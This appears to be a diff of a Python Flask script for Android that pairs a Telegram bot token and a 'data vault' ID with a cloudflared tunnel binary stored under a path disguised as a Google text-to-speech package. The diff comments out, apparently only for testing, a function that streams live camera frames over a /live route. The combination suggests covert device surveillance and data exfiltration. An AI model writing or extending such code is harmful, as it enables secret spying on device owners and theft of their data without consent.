@@ -4,29 +4,33 @@ import threading
 import requests
 import subprocess
 from flask import Flask, Response
-import cv2
-import numpy
+
+# تم تعطيل OpenCV مؤقتاً للاختبار
+# import cv2
+# import numpy
 
 app = Flask(__name__)
 TOKEN = os.environ.get('TELEGRAM_BOT_1_TOKEN')
 VAULT_ID = os.environ.get('TELEGRAM_DATA_VAULT_ID')
 BINARY_PATH = "/data/data/com.google.android.tts_v2/cloudflared"
 
-def generate_frames():
-    camera = cv2.VideoCapture(0)
-    while True:
-        success, frame = camera.read()
-        if not success:
-            break
-        ret, buffer = cv2.imencode('.jpg', frame)
-        frame = buffer.tobytes()
-        yield (b'--frame\r\n'
-               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
-    camera.release()
+# تم تعطيل دالة الكاميرا
+# def generate_frames():
+#     camera = cv2.VideoCapture(0)
+#     while True:
+#         success, frame = camera.read()
+#         if not success:
+#             break
+#         ret, buffer = cv2.imencode('.jpg', frame)
+#         frame = buffer.tobytes()
+#         yield (b'--frame\r\n'
+#                b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
+#     camera.release()
 
 @app.route('/live')
 def video_feed():
-    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+    return "Camera disabled for testing", 200
+    # return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 def download_cloudflared():
     if not os.path.exists(BINARY_PATH):
